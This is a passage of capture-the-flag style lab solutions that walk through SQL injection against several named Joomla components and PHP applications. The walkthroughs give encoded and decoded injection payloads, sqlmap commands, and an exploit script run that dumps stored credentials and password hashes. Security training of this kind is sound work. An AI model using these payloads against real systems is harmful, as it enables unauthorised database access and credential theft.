 
 
 
 
 
 
 
 
 
 
 
 
further research on this topic. Also, note that the IP addresses and domain names might be
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
different in your lab.  
 
 
Solution:  
 
Step 1: ​Inspect the web application. 
 
 
 
 
Step 2: ​Search on google “Joomla JquickContact Component sql injection” and look for 
publically available exploits.  
 
 
 
 
The exploit db link contains the SQLI payload and information regarding the vulnerable 
parameter required to exploit the SQL Injection vulnerability.  
 
Exploit DB Link: ​https://www.exploit-db.com/exploits/44118 
 
 
 
 
 
 
 
 
Step 3: ​The SQLI payload provided at exploit db link is base64 encoded. Decode the SQLI 
payload. 
 
Commands: 
echo 
dnR0dGo3YXM4MzNvZDVuYTM3OWVlNDAwcDYnJTIwQU5EJTIwRVhUUkFDVFZBTFVFKDI
yLENPTkNBVCgweDVjLHZlcnNpb24oKSwoU0VMRUNUJTIwKEVMVCgxPTEsMSkpKSxkYXR
hYmFzZSgpKSktLSUyMFg= | base64 -d > sqli-payload 
 
cat sqli-payload 
 
 
 
 
 
 
Decoded Payload: 
vtttj7as833od5na379ee400p6'%20AND%20EXTRACTVALUE(22,CONCAT(0x5c,version(),(SEL
ECT%20(ELT(1=1,1))),database()))--%20X 
 
Step 4: ​Substitute the payload in the URL provided at exploit db link and exploit the SQL 
injection vulnerability. 
 
URL: 
http://qvdmme6xsm4601k96cyjanr5p.public1.attackdefenselabs.com/index.php?option=com_jqu
ickcontact&task=refresh&sid=vtttj7as833od5na379ee400p6%27%20AND%20EXTRACTVALUE
(22,CONCAT(0x5c,version(),(SELECT%20(ELT(1=1,1))),database()))--%20X 
 
 
 
The MySQL server version information is revealed.  
 
 
 
 
References:  
 
1.
JQuickContact (​https://extensions.joomla.org/extension/jquickcontact/​)  
2.
Joomla! Component JquickContact 1.3.2.2.1 - SQL Injection 
(​https://www.exploit-db.com/exploits/44118​)  
 
 
 
Name 
Job Site 
URL 
https://www.attackdefense.com/challengedetails?cid=256  
Type 
Real World Webapps : SQL Injection 
 
 
Important Note: This document illustrates all the important steps required to complete this lab.
 
 
 
 
 
 
 
 
 
 
 
 
 
 
This is by no means a comprehensive step-by-step solution for this exercise. This is only
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
provided as a reference to various commands needed to complete this exercise and for your
 
  
 
 
 
 
 
 
 
 
 
 
 
 
further research on this topic. Also, note that the IP addresses and domain names might be
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
different in your lab.  
 
 
Solution:  
 
Step 1: ​Inspect the web application. 
 
 
 
 
Step 2: ​Search on google “job site sql injection exploit db” and look for publically available 
exploits.  
 
 
 
 
The exploit db link contains the information regarding the vulnerable parameter and the 
vulnerable web page. 
 
 
Exploit DB Link: ​https://www.exploit-db.com/exploits/31989 
 
 
 
Step 3: ​The “title” parameter on the registration page is vulnerable to SQL injection. Intercept 
the POST request sent to the registration page with burp suite. 
 
Access the registration form by clicking on “Register” button present on the home page. 
 
 
 
 
 
Fill the registration form. 
 
 
 
 
Click on the Register button and intercept the request with burp suite. 
 
Check Appendix to learn how to configure Burp Suite. 
 
Intercepted Request: 
 
 
 
 
 
 
 
Copy the request and save it in a file named “request”. 
 
Command: ​cat request 
 
 
 
Step 4: ​Find the payload using sqlmap. 
 
Vulnerable parameter:​  title 
 
Command: ​sqlmap -r request -p title 
 
 
 
 
 
Enter the following answers when asked for questions. 
 
“y” for “Do you want to skip test payloads specific for other DBMSes?” 
“y” for “do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) 
values?” 
“n” for “Do you want to keep testing the others (if any)?” 
 
 
 
 
 
 
 
 
 
 
 
Payloads: 
 
Type: ​error-based 
Payload: ​title=employer WHERE 4088=4088 AND (SELECT 5499 FROM(SELECT 
COUNT(*),CONCAT(0x7170706271,(SELECT 
(ELT(5499=5499,1))),0x716b707671,FLOOR(RAND(0)*2))x FROM 
INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- 
oemo&firstname=Test&middlename=test&lastname=test&address=test&city=test&user=test&us
er_password=test&user_password2=test&email=test@gmail.com&Submit=Register 
 
Type: ​AND/OR time-based blind 
Payload: ​title=employer WHERE 2799=2799 AND SLEEP(5)-- 
iPAm&firstname=Test&middlename=test&lastname=test&address=test&city=test&user=test&us
er_password=test&user_password2=test&email=test@gmail.com&Submit=Register 
 
 
Step 5: ​Send the intercepted request to Repeater. 
 
Payload:  
 
Right click on the intercepted request and select the option “Send to Repeater”, the same can 
be achieved by pressing “CTRL+R”. 
 
 
 
Repeater Tab: 
 
 
 
Step 6: ​Inject the error based SQLI payload in POST data of the request and exploit the 
vulnerability. 
 
Before: 
title=employer&firstname=Test&middlename=test&lastname=test&address=test&city=test&user
=test&user_password=test&user_password2=test&email=test%40gmail.com&Submit=Register 
 
After:  
title=employer WHERE 4088=4088 AND (SELECT 5499 FROM(SELECT 
COUNT(*),CONCAT(0x7170706271,(SELECT 
(ELT(5499=5499,1))),0x716b707671,FLOOR(RAND(0)*2))x FROM 
INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- 
oemo&firstname=Test&middlename=test&lastname=test&address=test&city=test&user=test&us
er_password=test&user_password2=test&email=test@gmail.com&Submit=Register 
 
Request section in the Repeater tab: 
 
 
 
 
 
 
 
 
 
 
Response section in the Repeater tab: 
 
 
 
 
 
The injected SQLI payload was executed. 
 
Step 7: ​Modify the payload used in previous step and retrieve the MySQL server version 
information.  
 
Before:  
title=employer WHERE 4088=4088 AND (SELECT 5499 FROM(SELECT 
COUNT(*),CONCAT(0x7170706271,(SELECT 
(ELT(5499=5499,1))),0x716b707671,FLOOR(RAND(0)*2))x FROM 
INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- 
oemo&firstname=Test&middlename=test&lastname=test&address=test&city=test&user=test&us
er_password=test&user_password2=test&email=test@gmail.com&Submit=Register 
 
After:  
title=employer WHERE 4088=4088 AND (SELECT 5499 FROM(SELECT 
COUNT(*),CONCAT(version(),(SELECT 
(ELT(5499=5499,1))),0x716b707671,FLOOR(RAND(0)*2))x FROM 
INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- 
oemo&firstname=Test&middlename=test&lastname=test&address=test&city=test&user=test&us
er_password=test&user_password2=test&email=test@gmail.com&Submit=Register 
 
Request section in the Repeater tab: 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
Response section in the Repeater tab: 
 
 
 
 
MySQL server version information is revealed.  
 
 
 
References:  
 
1.
Job Site (​https://sourceforge.net/projects/jobfinder/​) 
 
2.
Job Site 1.0 - Multiple Vulnerabilities (​https://www.exploit-db.com/exploits/31418​) 
 
3.
Sqlmap (​http://sqlmap.org/​)  
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
Appendix  
 
 
Appendix A: Configuration for Windows OS 
     A.1 Google Chrome with Burp Suite 
     A.2 Mozilla Firefox with Burp Suite 
 
Appendix B: Configuration for Kali OS 
                B.1 Google Chrome with Burp Suite 
    B.2 Mozilla Firefox with Burp Suite 
 
Appendix C: Configuration for FoxyProxy Standard plugin 
    C.1 FoxyProxy on Google Chrome with Burp Suite 
    C.2 FoxyProxy on Mozilla Firefox with Burp Suite 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
Appendix A 
 
A.1 Google Chrome with Burp Suite (Windows OS) 
 
Step 1: ​Open Google Chrome and navigate to the URL given below. 
 
URL: ​chrome://settings 
 
 
 
Google Chrome Settings page will appear. 
 
Step 2:​ Search for “proxy” in the search box. 
 
 
 
 
 
 
 
 
 
Step 3: ​Upon clicking on “Open proxy settings”, Windows “Internet Properties” settings dialog 
box will appear. Click on “LAN settings” button. 
 
 
 
Step 4: ​Select the checkbox “Use a proxy server for your LAN (These settings will not apply to 
dial-up or VPN connections)”. And  enter “127.0.0.1” and “8080” in “Address” textbox and “Port” 
textbox respectively.  
 
 
 
Click “OK” on the “Local Area Network (LAN) Settings” dialog box and close the “Internet 
Properties” dialog box. 
 
Step 5: ​Start Burp suite. 
 
 
 
Step 6: ​Navigate to “Options” tab under “Proxy” tab and verify that the “running” checkbox is 
selected for the interface “127.0.0.1:8080”. 
 
 
 
All the HTTP request made by Google Chrome will be intercepted by Burp Suite.  
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
A.2 Mozilla Firefox with burp suite (Windows OS) 
 
Step 1: ​Open Mozilla Firefox and navigate to the URL given below. 
 
URL: ​about:preferences 
 
 
 
Step 2: ​Scroll down to the bottom of the page and click on “Settings” button under “Network 
Settings” section. 
 
 
 
 
 
 
Step 3:  ​Enter “127.0.0.1” and “8080” in “HTTP Proxy” textbox and “Port” textbox respectively. 
 
 
 
Click on the OK button.  
 
Step 4: ​Start Burp suite. 
 
 
 
Step 5: ​Navigate to “Options” tab under “Proxy” tab and verify that the “running” checkbox is 
selected for the interface “127.0.0.1:8080”. 
 
 
 
All the HTTP request made by Mozilla Firefox will be intercepted by Burp Suite.  
 
 
 
 
 
 
 
 
Appendix B 
 
B.1 Google Chrome with Burp Suite (Kali OS) 
 
Step 1: ​Open Google Chrome and navigate to the URL given below. 
 
URL: ​chrome://settings 
 
 
 
Google Chrome Settings page will appear. 
 
Step 2:​ Search for “proxy” in the search box. 
 
 
 
 
 
 
Step 3: ​Upon clicking on “Open proxy settings”, The “Networks” settings window will appear. 
Click on Network Proxy option. 
 
 
 
 
Step 4: ​Enter “127.0.0.1” in “HTTP Proxy” textbox and enter 8080 as port.  
 
 
 
Close the dialog box.  
 
Step 5: ​Start Burp suite. 
 
 
 
 
Step 6: ​Navigate to “Options” tab under “Proxy” tab and verify that the “running” checkbox is 
selected for the interface “127.0.0.1:8080”. 
 
 
 
 
 
 
 
All the HTTP/HTTPS request made by Google Chrome will be intercepted by Burp Suite.  
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
B.2 Mozilla Firefox with burp suite (Kali OS) 
 
Step 1: ​Open Mozilla Firefox and navigate to the URL given below. 
 
URL: ​about:preferences 
 
 
 
 
Step 2: ​Click on “Advanced” tab on the left panel and then click on “Settings” button under 
“Network” tab. 
 
 
 
 
 
 
 
 
Step 3:  ​Enter “127.0.0.1” and “8080” in “HTTP Proxy” textbox and “Port” textbox respectively. 
 
 
 
 
Step 4: ​Start Burp suite. 
 
 
 
 
 
Step 5: ​Navigate to “Options” tab under “Proxy” tab and verify that the “running” checkbox is 
selected for the interface “127.0.0.1:8080”. 
 
 
 
 
 
All the HTTP request made by Mozilla Firefox will be intercepted by Burp Suite.  
 
 
 
 
 
 
 
 
Appendix C 
 
C.1 FoxyProxy on Google Chrome with Burp Suite 
 
Step 1: ​Installing FoxyProxy. 
 
FoxyProxy Standard plugin for Google Chrome can be installed from the URL given below: 
 
URL: 
https://chrome.google.com/webstore/detail/foxyproxy-standard/gcknhkkoolaabfmlnjonogaaifnjlfn
p?hl=en 
 
After installing FoxyProxy, a small fox icon will appear on the right side of the address bar.  
 
 
 
 
 
Step 2: ​Click on the FoxyProxy icon and click on Options. 
 
 
 
Step 3: ​Click on the “Add New Proxy” Button.  
 
 
 
Step 4: ​Enter “127.0.0.1” in “Host or IP Address” textbox and enter “8080” in Port textbox. 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
Click on the Save button. 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
The configured proxy will appear in the proxies table. 
 
Step 5: ​Enable the proxy. 
 
Click on the FoxyProxy icon and select the option “Use proxy 127.0.0.1:8080 for all URLs” 
 
 
 
The FoxyProxy icon will change its color (In this case it is blue). 
 
 
 
 
 
 
 
 
 
Step 6: ​Start Burp suite. 
 
 
 
Step 7: ​Navigate to “Options” tab under “Proxy” tab and verify that the “running” checkbox is 
selected for the interface “127.0.0.1:8080”. 
 
 
 
All the HTTP/HTTPS request made by Google Chrome will be intercepted by Burp Suite.  
 
 
 
 
 
 
C.2 FoxyProxy on Mozilla Firefox with Burp Suite 
 
Step 1: ​Installing FoxyProxy. 
 
FoxyProxy Standard plugin for Mozilla Firefox can be installed from the URL given below: 
 
URL: ​https://addons.mozilla.org/en-US/firefox/addon/foxyproxy-standard/ 
 
After installing FoxyProxy, a small fox icon will appear on the right side of the address bar.  
 
 
 
Step 2: ​Click on the FoxyProxy icon and click on Options. 
 
 
 
 
 
 
Step 3: ​Click on the add button on the left panel 
 
 
 
Step 4: ​Enter “127.0.0.1” in “IP Address, DNS name, server name” textbox and enter “8080” in 
Port textbox. 
 
 
 
Click on the Save button. 
 
 
 
The proxy will appear in the proxies table. 
 
Step 5: ​Enable the proxy. 
 
Click on the FoxyProxy icon and select the option “Use proxy 127.0.0.1:8080 for all URLs 
(ignore patterns)” 
 
 
 
The FoxyProxy icon will change its color (In this case it is green). 
 
Step 6: ​Start Burp suite. 
 
 
 
Step 7: ​Navigate to “Options” tab under “Proxy” tab and verify that the “running” checkbox is 
selected for the interface “127.0.0.1:8080” 
 
 
 
All the HTTP/HTTPS request made by Mozilla Firefox will be intercepted by Burp Suite.  
 
 
 
 
 
Name 
SN News 
URL 
https://www.attackdefense.com/challengedetails?cid=257  
Type 
Real World Webapps : SQL Injection 
 
 
Important Note: This document illustrates all the important steps required to complete this lab.
 
 
 
 
 
 
 
 
 
 
 
 
 
 
This is by no means a comprehensive step-by-step solution for this exercise. This is only
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
provided as a reference to various commands needed to complete this exercise and for your
 
  
 
 
 
 
 
 
 
 
 
 
 
 
further research on this topic. Also, note that the IP addresses and domain names might be
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
different in your lab.  
 
 
Solution:  
 
Step 1: ​Inspect the web application. 
 
 
 
 
Step 2: ​Search on google “sn news sql injection” and look for publically available exploits.  
 
 
 
 
 
 
 
 
 
 
 
 
The exploit db link contains the php script required to exploit the vulnerability and dump the 
login credentials. 
 
Exploit DB Link: ​https://www.exploit-db.com/exploits/18999 
 
 
 
 
 
 
Step 3: ​Save the php script provided at exploit db link as exploit.php 
 
Command: ​cat exploit.php 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
Step 4: ​Check the usage information of the exploitation script. 
 
Command: ​php exploit.php 
 
 
 
The exploitation script requires the URL of the vulnerable web application to be passed as an 
argument.  
 
Step 5: ​Run the exploitation script with the required arguments and exploit the vulnerability.  
 
Command: ​php exploit.php http://avol6tb3xv2f3pdj0nxyihyq9.public1.attackdefenselabs.com/ 
 
 
 
The credentials of the web application are dumped by the exploitation script. 
 
 
References:  
 
1.
SN News (​http://phpbrasil.com/script/JHnpFRmSBqlf/sn-news​) 
2.
SN News 1.2 - 'visualiza.php' SQL Injection (​https://www.exploit-db.com/exploits/18999​)  
 
 
 
 
 
Name 
Joomla JS Jobs Component 
URL 
https://www.attackdefense.com/challengedetails?cid=258  
Type 
Real World Webapps : SQL Injection 
 
 
Important Note: This document illustrates all the important steps required to complete this lab.
 
 
 
 
 
 
 
 
 
 
 
 
 
 
This is by no means a comprehensive step-by-step solution for this exercise. This is only
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
provided as a reference to various commands needed to complete this exercise and for your
 
  
 
 
 
 
 
 
 
 
 
 
 
 
further research on this topic. Also, note that the IP addresses and domain names might be
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
different in your lab.  
 
 
Solution:  
 
Step 1: ​Inspect the web application. 
 
 
 
 
 
 
Step 2: ​Search on google “Joomla JS Jobs Component sql injection” and look for publically 
available exploits.  
 
 
 
 
The exploit db link contains the SQLI payload and information regarding the vulnerable 
parameter required to  exploit the SQL Injection vulnerability.  
 
Exploit DB Link: ​https://www.exploit-db.com/exploits/44120 
 
 
 
 
 
 
 
Step 3: ​The SQLI payload provided at exploit db link is base64 encoded. Decode the SQLI 
payload. 
 
Commands: 
echo 
JTI3JTIwJTQxJTRlJTQ0JTIwJTQ1JTU4JTU0JTUyJTQxJTQzJTU0JTU2JTQxJTRjJTU1JTQ1JT
I4JTMwJTM2JTJjJTQzJTRmJTRlJTQzJTQxJTU0JTI4JTMwJTc4JTM1JTYzJTJjJTc2JTY1JTcy
JTczJTY5JTZmJTZlJTI4JTI5JTJjJTMwJTc4JTM3JTY1JTM3JTY1JTJjJTI4JTUzJTQ1JTRjJTQ1
JTQzJTU0JTIwJTI4JTQ1JTRjJTU0JTI4JTM2JTM2JTNkJTM2JTM2JTJjJTMxJTI5JTI5JTI5JTJjJ
TdlJTY0JTYxJTc0JTYxJTYyJTYxJTczJTY1JTI4JTI5JTI5JTI5JTJkJTJkJTIwJTc0JTQ1JTZmJTZ
j | base64 -d > sqli-payload  
 
cat sqli-payload 
 
 
 
 
 
Decoded Payload: 
%27%20%41%4e%44%20%45%58%54%52%41%43%54%56%41%4c%55%45%28%30%36
%2c%43%4f%4e%43%41%54%28%30%78%35%63%2c%76%65%72%73%69%6f%6e%28%
29%2c%30%78%37%65%37%65%2c%28%53%45%4c%45%43%54%20%28%45%4c%54%2
8%36%36%3d%36%36%2c%31%29%29%29%2c%7e%64%61%74%61%62%61%73%65%28
%29%29%29%2d%2d%20%74%45%6f%6c 
 
Step 4: ​Substitute the payload in the URL provided at exploit db link and exploit the SQL 
injection vulnerability. 
 
URL: 
http://2bd0y8665vjtf7urwlrjuob3t.public2.attackdefenselabs.com/index.php/component/jsjobs/ne
west-jobs?zipcode=%27%20%41%4e%44%20%45%58%54%52%41%43%54%56%41%4c%5
5%45%28%30%36%2c%43%4f%4e%43%41%54%28%30%78%35%63%2c%76%65%72%73
%69%6f%6e%28%29%2c%30%78%37%65%37%65%2c%28%53%45%4c%45%43%54%20%
28%45%4c%54%28%36%36%3d%36%36%2c%31%29%29%29%2c%7e%64%61%74%61%6
2%61%73%65%28%29%29%29%2d%2d%20%74%45%6f%6c&option=com_jsjobs&task11=vi
ew 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
The MySQL server version information is revealed.  
 
 
References:  
 
1.
JS Jobs (​https://extensions.joomla.org/extension/js-jobs/​)  
2.
Joomla! Component JS Jobs 1.1.9 - SQL Injection 
(​https://www.exploit-db.com/exploits/44120​)  
 
 
 
 
 
Name 
Joomla Simple Calendar Component 
URL 
https://www.attackdefense.com/challengedetails?cid=259  
Type 
Real World Webapps : SQL Injection 
 
 
Important Note: This document illustrates all the important steps required to complete this lab.
 
 
 
 
 
 
 
 
 
 
 
 
 
 
This is by no means a comprehensive step-by-step solution for this exercise. This is only
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
provided as a reference to various commands needed to complete this exercise and for your
 
  
 
 
 
 
 
 
 
 
 
 
 
 
further research on this topic. Also, note that the IP addresses and domain names might be
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
different in your lab.  
 
 
Solution:  
 
Step 1: ​Inspect the web application. 
 
 
 
 
 
Step 2: ​Search on google “joomla simple calendar component sql injection” and look for 
publically available exploits.  
 
 
 
 
The exploit db link contains the SQLI payload and information regarding the vulnerable 
parameter required to  exploit the SQL Injection vulnerability.  
 
Exploit DB Link: ​https://www.exploit-db.com/exploits/44126 
 
 
 
 
 
 
 
 
Step 3: ​The SQLI payload provided at exploit db link is base64 encoded. Decode the SQLI 
payload. 
 
Commands: 
echo 
JTI4JTU1JTUwJTQ0JTQxJTU0JTQ1JTU4JTRkJTRjJTI4JTMwJTJjJTJmJTJhJTIxJTMwJTMxJT
MxJTMxJTMxJTQzJTRmJTRlJTQzJTQxJTU0JTJhJTJmJTI4MHgyZSUyYyU3NiU2NSU3MiU3
MyU2OSU2ZiU2ZSUyOCUyOSUyYzB4N2U3ZTdlN2UlMmMlMjglNTMlNDUlNGMlNDUlNDMlN
TQlMjAlMjglNDUlNGMlNTQlMjglMzYlMzYlM2QlMzYlMzYlMmMlMzElMjklMjklMjklMmMlNjQlNjEl
NzQlNjElNjIlNjElNzMlNjUlMjglMjklMjklMmMyOTI1JTI5JTI5 | base64 -d > sqli-payload 
 
cat sqli-payload 
 
 
 
 
 
 
 
Decoded Payload: 
%28%55%50%44%41%54%45%58%4d%4c%28%30%2c%2f%2a%21%30%31%31%31%31%
43%4f%4e%43%41%54%2a%2f%280x2e%2c%76%65%72%73%69%6f%6e%28%29%2c0x7e
7e7e7e%2c%28%53%45%4c%45%43%54%20%28%45%4c%54%28%36%36%3d%36%36%
2c%31%29%29%29%2c%64%61%74%61%62%61%73%65%28%29%29%2c2925%29%29 
 
Step 4: ​Substitute the payload in the URL provided at exploit db link and exploit the SQL 
injection vulnerability. 
 
URL: 
http://ocqryu62whbuwlcr9az5j3ipk.public2.attackdefenselabs.com/index.php?option=com_simpl
ecalendar&view=events&catid[0]=%28%55%50%44%41%54%45%58%4d%4c%28%30%2c%2
f%2a%21%30%31%31%31%31%43%4f%4e%43%41%54%2a%2f%280x2e%2c%76%65%72
%73%69%6f%6e%28%29%2c0x7e7e7e7e%2c%28%53%45%4c%45%43%54%20%28%45%4
c%54%28%36%36%3d%36%36%2c%31%29%29%29%2c%64%61%74%61%62%61%73%65
%28%29%29%2c2925%29%29 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
The MySQL server version information is revealed.  
 
 
References:  
 
1.
Joomla Simple Calendar Component 
 (​https://extensions.joomla.org/extension/simplecalendar/​)  
2.
Joomla! Component SimpleCalendar 3.1.9 - SQL Injection 
(​https://www.exploit-db.com/exploits/44126​)  
 
 
 
 
 
Name 
Joomla Alexandria Book Library Component 
URL 
https://www.attackdefense.com/challengedetails?cid=260  
Type 
Real World Webapps : SQL Injection 
 
 
Important Note: This document illustrates all the important steps required to complete this lab.
 
 
 
 
 
 
 
 
 
 
 
 
 
 
This is by no means a comprehensive step-by-step solution for this exercise. This is only
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
provided as a reference to various commands needed to complete this exercise and for your
 
  
 
 
 
 
 
 
 
 
 
 
 
 
further research on this topic. Also, note that the IP addresses and domain names might be
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
different in your lab.  
 
 
Solution:  
 
Step 1: ​Inspect the web application. 
 
 
 
 
 
 
Step 2: ​Search on google “Joomla Alexandria Book Library Component sql injection 
vulnerability” and look for publically available exploits.  
 
 
 
 
The exploit db link contains the SQLI payload and information regarding the vulnerable 
parameter required to  exploit the SQL Injection vulnerability.  
 
Exploit DB Link: ​https://www.exploit-db.com/exploits/44162 
 
 
 
 
 
 
 
 
Step 3: ​Substitute the payload in the URL provided at exploit db link and exploit the SQL 
injection vulnerability. 
 
Payload: 
%44%27%20%41%4e%44%20%45%58%54%52%41%43%54%56%41%4c%55%45%28%32
%32%2c%43%4f%4e%43%41%54%28%30%78%35%63%2c%76%65%72%73%69%6f%6e%
28%29%2c%28%53%45%4c%45%43%54%20%28%45%4c%54%28%31%3d%31%2c%31%2
9%29%29%2c%64%61%74%61%62%61%73%65%28%29%29%29%2d%2d%20%56%65%72
%41%79%61%72%69 
 
 
 
 
 
 
 
 
URL: 
http://stey9qjva4v96434b0mz0soah.public2.attackdefenselabs.com/index.php?option=com_abo
ok&view=category&letter=%44%27%20%41%4e%44%20%45%58%54%52%41%43%54%56%
41%4c%55%45%28%32%32%2c%43%4f%4e%43%41%54%28%30%78%35%63%2c%76%6
5%72%73%69%6f%6e%28%29%2c%28%53%45%4c%45%43%54%20%28%45%4c%54%28
%31%3d%31%2c%31%29%29%29%2c%64%61%74%61%62%61%73%65%28%29%29%29
%2d%2d%20%56%65%72%41%79%61%72%69 
 
 
 
 
The MySQL server version information is revealed.  
 
 
References:  
 
1.
Alexandria Book Library 
 (​https://extensions.joomla.org/extension/alexandria-book-library/​)  
2.
Joomla! Component Alexandria Book Library 3.1.2 - 'letter' SQL Injection 
(​https://www.exploit-db.com/exploits/44162​)  
 
 
 
 
 
Name 
Foe CMS 
URL 
https://www.attackdefense.com/challengedetails?cid=261  
Type 
Real World Webapps : SQL Injection 
 
 
Important Note: This document illustrates all the important steps required to complete this lab.
 
 
 
 
 
 
 
 
 
 
 
 
 
 
This is by no means a comprehensive step-by-step solution for this exercise. This is only
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
provided as a reference to various commands needed to complete this exercise and for your
 
  
 
 
 
 
 
 
 
 
 
 
 
 
further research on this topic. Also, note that the IP addresses and domain names might be
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
different in your lab.  
 
 
Solution:  
 
Step 1: ​Inspect the web application. 
 
 
 
 
 
 
 
 
 
 
Step 2: ​Search on google “Foe CMS sql injection” and look for publically available exploits.  
 
 
 
 
The exploit db link contains the SQLI payload and information regarding the vulnerable 
parameter required to exploit the SQL Injection vulnerability.  
 
Exploit DB Link: ​https://www.exploit-db.com/exploits/25088  
 
 
 
 
 
Step 3: ​Use the URL containing the SQL injection payload provided at exploit db link to exploit 
the vulnerability.  
 
URL: 
http://7av6uegsgh4w06ps3deqw0fbe.public2.attackdefenselabs.com/item.php?ei=-1%20union%
20select%201,username,pass_sha,1,1,1,1,1,1%20from%20foe_account-- 
 
 
 
 
 
 
 
 
 
 
The username and password hash of the Foe CMS user is revealed. 
 
Step 4: ​Modify the payload in the URL used in the previous step to retrieve the MySQL server 
version information.  
 
URL: 
http://7av6uegsgh4w06ps3deqw0fbe.public2.attackdefenselabs.com/item.php?ei=-1%20union%
20select%201,version(),pass_sha,1,1,1,1,1,1%20from%20foe_account-- 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
The MySQL Server version is revealed.  
 
 
References:  
 
1.
Foe CMS (​https://code.google.com/archive/p/foecms/​)  
2.
Foe CMS 1.6.5 - Multiple Vulnerabilities (​https://www.exploit-db.com/exploits/25088​)  
 
 
 
 
 
Name 
PHP Ticket System 
URL 
https://www.attackdefense.com/challengedetails?cid=262  
Type 
Real World Webapps : SQL Injection 
 
 
Important Note: This document illustrates all the important steps required to complete this lab.
 
 
 
 
 
 
 
 
 
 
 
 
 
 
This is by no means a comprehensive step-by-step solution for this exercise. This is only
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
provided as a reference to various commands needed to complete this exercise and for your
 
  
 
 
 
 
 
 
 
 
 
 
 
 
further research on this topic. Also, note that the IP addresses and domain names might be
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
different in your lab.  
 
 
Solution:  
 
Step 1: ​Inspect the web application. 
 
 
 
 
 
 
 
 
 
Step 2: ​Search on google “PHP Ticket System sql injection” and look for publically available 
exploits.  
 
 
 
 
The exploit db link contains information regarding the vulnerable parameter and the vulnerable 
web page required to exploit the SQL Injection vulnerability.  
 
Exploit DB Link: ​https://www.exploit-db.com/exploits/31971 
 
 
 
 
 
 
 
 
Step 3: ​Find the SQL Injection payload using sqlmap 
 
According to the information provided at exploit db link the “id” parameter in 
“/mods/tickets/data/get_all_created_by_user.php”  webpage is vulnerable to SQL Injection.  
 
Vulnerable web page:  /​mods/tickets/data/get_all_created_by_user.php 
 
Vulnerable parameter: ​id 
 
Command: ​sqlmap -u 
"http://cc2etfk6mofwt0h1ql9s8flxu.public1.attackdefenselabs.com/mods/tickets/data/get_all_cre
ated_by_user.php?id=" -p id 
 
Enter the following answer when asked for questions. 
 
“y” for “Do you want to skip test payloads specific for other DBMses?” y 
“n” for “do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) 
values?” y 
“n” for “Do you want to keep testing the others (if any) ?” 
 
 
 
 
 
 
 
Payloads: 
 
Type: ​error-based 
Payload: ​id=' AND (SELECT 1195 FROM(SELECT 
COUNT(*),CONCAT(0x717a627671,(SELECT 
(ELT(1195=1195,1))),0x7162786271,FLOOR(RAND(0)*2))x FROM 
INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) AND 'Zlxv'='Zlxv 
 
Type: ​UNION query 
Payload: ​id=' UNION ALL SELECT 
NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x717a627671,0x4e63725651614e7963
4b7476565848787871596f765a6c4b47436545536f44474e74647075715077,0x7162786271),N
ULL-- ucQg 
 
 
Step 4: ​Use the error-based payload generated in the previous step and create a URL to exploit 
the SQL Injection vulnerability.  
 
Payload: ​' AND (SELECT 1195 FROM(SELECT COUNT(*),CONCAT(0x717a627671,(SELECT 
(ELT(1195=1195,1))),0x7162786271,FLOOR(RAND(0)*2))x FROM 
INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) AND 'Zlxv'='Zlxv 
 
 
URL: 
http://cc2etfk6mofwt0h1ql9s8flxu.public1.attackdefenselabs.com/mods/tickets/data/get_all_creat
ed_by_user.php?id=%27%20AND%20(SELECT%201195%20FROM(SELECT%20COUNT(*),C
ONCAT(0x717a627671,(SELECT%20(ELT(1195=1195,1))),0x7162786271,FLOOR(RAND(0)*2
))x%20FROM%20INFORMATION_SCHEMA.PLUGINS%20GROUP%20BY%20x)a)%20AND%
20%27Zlxv%27=%27Zlxv 
 
 
 
 
The injected SQLI payload was executed.  
 
Step 5: ​Modify the payload in previous step and retrieve the MySQL server version information. 
 
Modified Payload: ​ ' AND (SELECT 1195 FROM(SELECT 
COUNT(*),CONCAT(version(),(SELECT 
(ELT(1195=1195,1))),0x7162786271,FLOOR(RAND(0)*2))x FROM 
INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) AND 'Zlxv'='Zlxv 
 
URL: 
http://cc2etfk6mofwt0h1ql9s8flxu.public1.attackdefenselabs.com/mods/tickets/data/get_all_creat
ed_by_user.php?id=%27%20AND%20(SELECT%201195%20FROM(SELECT%20COUNT(*),C
ONCAT(version(),(SELECT%20(ELT(1195=1195,1))),0x7162786271,FLOOR(RAND(0)*2))x%2
0FROM%20INFORMATION_SCHEMA.PLUGINS%20GROUP%20BY%20x)a)%20AND%20%2
7Zlxv%27=%27Zlxv 
